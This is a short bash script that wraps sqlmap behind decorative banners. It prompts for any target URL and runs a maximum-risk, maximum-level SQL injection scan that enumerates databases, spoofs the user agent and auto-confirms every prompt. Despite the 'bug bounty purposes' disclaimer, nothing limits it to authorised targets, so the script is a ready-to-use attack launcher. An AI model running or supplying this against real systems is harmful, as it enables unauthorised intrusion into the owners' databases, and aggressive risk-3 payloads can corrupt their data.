figlet "SQL INJECT WITH 1337 STYLE" | lolcat
sleep 0.5
toilet -f mono12 -F metal by SaintDruG 
echo "Enter Target URL with Parameter:" | lolcat
read URL
sqlmap -u $URL --risk=3 --level=5 --dbs --random-agent --batch
echo "Injection Complete GL Bro, Try Harder!" | lolcat
sleep 0.5
echo "COPYRIGHTS ALL RIGHTS RESERVED - BLACK HAT ETHICAL HACKING" | lolcat
sleep 0.5
echo "---------------------------------------------------------------------" | lolcat
sleep 0.5
echo "Written by SaintDruG for Bug Bounty Purposes only for hackerone.com" | lolcat
xcowsay blackhatethicalhacking.com
# Description:
#Written by SaintDruG 
# This tool will start SQLMAP with Risk 3, Level 5 look for dbs using random agent without any 
#evasion techniques for quick scan and identification of issues, it will automatcially answer all 
#questions with Yes so it can go fast like lighting
